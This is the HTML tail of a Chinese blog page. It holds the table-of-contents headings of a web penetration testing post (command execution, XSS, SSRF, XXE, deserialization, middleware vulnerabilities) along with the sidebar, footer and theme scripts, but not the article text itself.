href="#4-7-expect"><span class="toc-text">4.7 expect</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-PHP%E4%B8%8D%E5%B8%B8%E7%94%A8%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">5 PHP不常用伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E9%98%B2%E6%8A%A4"><span class="toc-text">6 防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">六、命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-php%E5%87%BD%E6%95%B0"><span class="toc-text">1 php函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Windows%E5%87%BD%E6%95%B0"><span class="toc-text">2 Windows函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Linux%E5%87%BD%E6%95%B0"><span class="toc-text">3 Linux函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%BB%95%E8%BF%87"><span class="toc-text">4 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-text">4.1 空格绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="toc-text">4.2 关键字绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87"><span class="toc-text">4.3 其他绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%98%B2%E6%8A%A4"><span class="toc-text">5 防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">七、代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%99%AE%E9%80%9A%E5%87%BD%E6%95%B0"><span class="toc-text">1 普通函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%AF%E5%8F%98%E5%87%BD%E6%95%B0"><span class="toc-text">2 可变函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81XSS%E6%BC%8F%E6%B4%9E"><span class="toc-text">八、XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-text">1 反射型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-text">2 存储型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-DOM%E5%9E%8B"><span class="toc-text">3 DOM型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%BB%95%E8%BF%87-1"><span class="toc-text">4 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%98%B2%E6%8A%A4-1"><span class="toc-text">5 防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81SSRF%E6%BC%8F%E6%B4%9E"><span class="toc-text">九、SSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8"><span class="toc-text">1 利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%98%B2%E6%8A%A4"><span class="toc-text">2 防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E3%80%81CSRF%E5%89%96%E6%9E%90"><span class="toc-text">十、CSRF剖析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8-1"><span class="toc-text">1 利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%98%B2%E6%8A%A4-1"><span class="toc-text">2 防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81XXE%E6%BC%8F%E6%B4%9E"><span class="toc-text">十一、XXE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-XML%E5%9F%BA%E7%A1%80"><span class="toc-text">1 XML基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-XXE%E6%BC%8F%E6%B4%9E"><span class="toc-text">2 XXE漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%98%B2%E6%8A%A4"><span class="toc-text">3 防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">十二、反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">1 php反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-%E5%BA%8F%E5%88%97%E5%8C%96%E7%9F%A5%E8%AF%86"><span class="toc-text">1.1 序列化知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-text">1.2 序列化利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">2 JAVA反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%89%E3%80%81SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5"><span class="toc-text">十三、SSTI模版注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-text">十四、中间件漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-IIS"><span class="toc-text">1 IIS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-PUT%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-text">1.1 PUT上传漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E"><span class="toc-text">1.2 短文件名枚举漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-HTTPS-sys"><span class="toc-text">1.3 HTTPS.sys</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-JBoss"><span class="toc-text">2 JBoss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Tomcat"><span class="toc-text">3 Tomcat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-WebLogic"><span class="toc-text">4 WebLogic</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%94%E3%80%81%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">十五、解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Web%E5%AE%B9%E5%99%A8"><span class="toc-text">1 Web容器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Apache"><span class="toc-text">2 Apache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-PHP-CGI"><span class="toc-text">3 PHP CGI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-IIS"><span class="toc-text">4 IIS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Nginx"><span class="toc-text">5 Nginx</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%BC%8F%E6%B4%9E"><span class="toc-text">十六、数据库漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SQL-Server"><span class="toc-text">1 SQL Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-MySQL"><span class="toc-text">2 MySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Oracle"><span class="toc-text">3 Oracle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Redis"><span class="toc-text">4 Redis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">5 漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%BB%E5%8D%81%E4%B8%83%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">※十七、代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%BB%E5%8D%81%E5%85%AB%E3%80%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-text">※十八、逻辑漏洞</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/251c2987.html" title="C++游戏"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_10.png" onerror="this.onerror=null;this.src='/img/error.png'" alt="C++游戏"/></a><div class="content"><a class="title" href="/posts/251c2987.html" title="C++游戏">C++游戏</a><time datetime="2023-10-17T04:00:00.000Z" title="发表于 2023-10-17 12:00:00">2023-10-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/364ea8cc.html" title="设计模式"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_4.png" onerror="this.onerror=null;this.src='/img/error.png'" alt="设计模式"/></a><div class="content"><a class="title" href="/posts/364ea8cc.html" title="设计模式">设计模式</a><time datetime="2023-10-11T04:00:00.000Z" title="发表于 2023-10-11 12:00:00">2023-10-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d7e8ef81.html" title="Typescript"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_3.png" onerror="this.onerror=null;this.src='/img/error.png'" alt="Typescript"/></a><div class="content"><a class="title" href="/posts/d7e8ef81.html" title="Typescript">Typescript</a><time datetime="2023-10-05T04:00:00.000Z" title="发表于 2023-10-05 12:00:00">2023-10-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/668ce02c.html" title="Cocos2D"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_12.png" onerror="this.onerror=null;this.src='/img/error.png'" alt="Cocos2D"/></a><div class="content"><a class="title" href="/posts/668ce02c.html" title="Cocos2D">Cocos2D</a><time datetime="2023-10-01T04:00:00.000Z" title="发表于 2023-10-01 12:00:00">2023-10-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1362c546.html" title="星火编辑器"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_1.png" onerror="this.onerror=null;this.src='/img/error.png'" alt="星火编辑器"/></a><div class="content"><a class="title" href="/posts/1362c546.html" title="星火编辑器">星火编辑器</a><time datetime="2023-09-24T04:00:00.000Z" title="发表于 2023-09-24 12:00:00">2023-09-24</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/default_cover_10.png')"><div id="footer-wrap"><div class="copyright">&copy;2023 By Maigaleaf</div><div class="footer_custom_text">版本V1.03</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><!-- 按钮阅读进度--><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i><span id="percent">0<span>%</span></span></button><!-- 至底--><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script async src="https://cdn1.tianli0.top/npm/vue@2.6.14/dist/vue.min.js"></script><script async src="https://cdn1.tianli0.top/npm/element-ui@2.15.6/lib/index.js"></script><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer data-pjax src="/js/readPercent.js"></script><script defer src="/js/copy.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="40" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_footer_beautify_injector_config(){
    var parent_div_git = document.getElementById('footer-wrap');
    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v6.3.0" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v4.8.5" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
    console.log('已挂载butterfly_footer_beautify')
    parent_div_git.insertAdjacentHTML("beforeend",item_html)
    }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_footer_beautify_injector_config();
  }
  else if (epage === cpage){
    butterfly_footer_beautify_injector_config();
  }
  </script><script async src="/js/runtime.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__fadeIn');
    arr[i].setAttribute('data-wow-duration', '2s');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '100');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__fadeInRight');
    arr[i].setAttribute('data-wow-duration', '1.25s');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '100');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="posts/54924480.html" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_10.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-05-21</span><a class="blog-slider__title" href="posts/54924480.html" alt="">Web渗透</a><div class="blog-slider__text">Web渗透概述</div><a class="blog-slider__button" href="posts/54924480.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="posts/4b0178e0.html" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_3.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-05-21</span><a class="blog-slider__title" href="posts/4b0178e0.html" alt="">数据结构与算法</a><div class="blog-slider__text">数据结构与算法概述</div><a class="blog-slider__button" href="posts/4b0178e0.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="posts/cc1b9611.html" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_15.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-05-21</span><a class="blog-slider__title" href="posts/cc1b9611.html" alt="">JavaScript</a><div class="blog-slider__text">JavaScript概述</div><a class="blog-slider__button" href="posts/cc1b9611.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="posts/c036635b.html" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_14.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-05-21</span><a class="blog-slider__title" href="posts/c036635b.html" alt="">PHP</a><div class="blog-slider__text">PHP概述</div><a class="blog-slider__button" href="posts/c036635b.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="posts/b81b1ca5.html" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_6.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-05-21</span><a class="blog-slider__title" href="posts/b81b1ca5.html" alt="">masm32汇编</a><div class="blog-slider__text">masm32汇编概述</div><a class="blog-slider__button" href="posts/b81b1ca5.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="posts/a378bd8e.html" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_1.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-05-21</span><a class="blog-slider__title" href="posts/a378bd8e.html" alt="">Python</a><div class="blog-slider__text">Python使用概述</div><a class="blog-slider__button" href="posts/a378bd8e.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="posts/cf1dc19e.html" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/default_cover_11.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-05-21</span><a class="blog-slider__title" href="posts/cf1dc19e.html" alt="">Unity脚本</a><div class="blog-slider__text">Unity脚本程序概述</div><a class="blog-slider__button" href="posts/cf1dc19e.html" alt="">详情   </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
    console.log('已挂载butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = '/';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>